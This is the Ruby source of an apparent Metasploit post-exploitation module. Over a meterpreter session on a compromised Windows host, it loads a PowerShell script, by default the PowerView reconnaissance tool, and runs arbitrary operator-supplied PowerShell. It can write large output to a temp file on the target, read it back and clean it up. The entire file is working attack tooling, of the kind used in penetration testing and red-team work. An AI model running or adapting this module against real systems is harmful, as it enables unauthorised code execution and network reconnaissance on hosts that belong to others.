##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'zlib'

# require 'rex/post/meterpreter/extensions/powershell/powershell'
class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::FileDropper


  def initialize(info = {})
    super(update_info(info,
                      'Name'         => "Muit Manage Powershell load and run function",
                      'Description'  => %q{
        This module will Load a Powershell script and run function in the script over a meterpreter session.
        The user may also enter text substitutions to be made in memory before execution.
        Setting VERBOSE to true will output both the script prior to execution and the results.
      },
                      'License'      => MSF_LICENSE,
                      'Platform'     => ['win',],
                      'SessionTypes' => ['meterpreter'],
                      'Author'       => [
                              'viper',
                      ]
          ))

    register_options(
            [
                    OptString.new('SCRIPT', [true, 'Path to the local Powershell script', ::File.join(Msf::Config.install_root, "scripts", "ps", "PowerView.ps1")]),
                    OptString.new('EXECUTE_STRING', [true, 'powershell string to run,', '']),
                    OptString.new('CHECK_CSHARP_CLASS', [false, 'csharp class to check is exist,', nil]),
            ])

    register_advanced_options(
            [
                    OptInt.new('TIMEOUT', [false, 'Execution timeout', 600]),
                    OptBool.new('LARGEOUTPUT', [false, 'Write powershell output to file,then download file', false]),
                    OptBool.new('CHECK_FUNCTION', [true, 'check if function exist,do not import script,', true]),
            ])

  end

  def run

    if session.type == "shell"
      pub_json_result(false,
                      'Unsupport shell type',
                      nil,
                       self.uuid)
      return
    end

    if File.file?(File.join(Msf::Config.install_root, "scripts", "ps", datastore['SCRIPT']))
      script_path = File.join(Msf::Config.install_root, "scripts", "ps", datastore['SCRIPT'])
    elsif File.file?(datastore['SCRIPT'])
      script_path = datastore['SCRIPT']
    else
      pub_json_result(false,
                      "#{datastore['SCRIPT']} not found",
                      nil,
                      self.uuid)
      return
    end

    unless session.platform == "windows"
      pub_json_result(false,
                      'linux did not have powershell extensions',
                      nil,
                      self.uuid)
      return
    end

    session.load_powershell
    if session.ext.aliases.has_key?('powershell')
      ps_ext = session.ext.aliases['powershell']
      if datastore['CHECK_CSHARP_CLASS'] != nil
        checkcode = {code: datastore['CHECK_CSHARP_CLASS']}
        psresult  = ps_ext.execute_string(checkcode)
        if psresult.include? "Unable to find type" or psresult.include? datastore['CHECK_CSHARP_CLASS']
          opts = {file: script_path}
          begin
            loadResult = ps_ext.import_file(opts, datastore['TIMEOUT'])
          rescue ::Timeout::Error, Rex::TimeoutError
            pub_json_result(false,
                            'run script timeout,please set timeout bigger',
                            nil,
                            self.uuid)
            return
          end
        end
      elsif datastore['CHECK_FUNCTION']
        checkcode = {code: "Get-Command -Name " + datastore['EXECUTE_STRING']}
        psresult  = ps_ext.execute_string(checkcode)
        if psresult.include? "CommandNotFoundException" or psresult.include? "ERROR: Get-Command"
          opts = {file: script_path}
          begin
            loadResult = ps_ext.import_file(opts, datastore['TIMEOUT'])
          rescue ::Timeout::Error, Rex::TimeoutError
            pub_json_result(false,
                            'run script timeout,please set timeout bigger',
                            nil,
                            self.uuid)
            return
          end
        end
      else
        opts = {file: script_path}
        begin
          loadResult = ps_ext.import_file(opts, datastore['TIMEOUT'])
        rescue ::Timeout::Error, Rex::TimeoutError
          pub_json_result(false,
                          'run script timeout,please set timeout bigger',
                          nil,
                          self.uuid)
          return
        end
      end

      if datastore['LARGEOUTPUT']
        filename = get_env('TEMP') + '\\' + Time.now.to_i.to_s
        code     = {code: datastore['EXECUTE_STRING'] + "| Out-File " + filename}
        begin
          psresult = ps_ext.execute_string(code, datastore['TIMEOUT'])
        rescue ::Timeout::Error, Rex::TimeoutError
          pub_json_result(false,
                          'run script timeout,please set timeout bigger',
                          nil,
                          self.uuid)
          return
        end
        psresult = read_file(filename)
        register_file_for_cleanup(filename)
      else
        code = {code: datastore['EXECUTE_STRING']}
        begin
          psresult = ps_ext.execute_string(code, datastore['TIMEOUT'])
        rescue ::Timeout::Error, Rex::TimeoutError
          pub_json_result(false,
                          'run script timeout,please set timeout bigger',
                          nil,
                          self.uuid)
          return
        end
      end

      pub_json_result(true,
                      nil,
                      psresult,
                      self.uuid)
      return
    else
      pub_json_result(false,
                      'powershell extensions load failed',
                      nil,
                      self.uuid)
      return
    end
  end
end

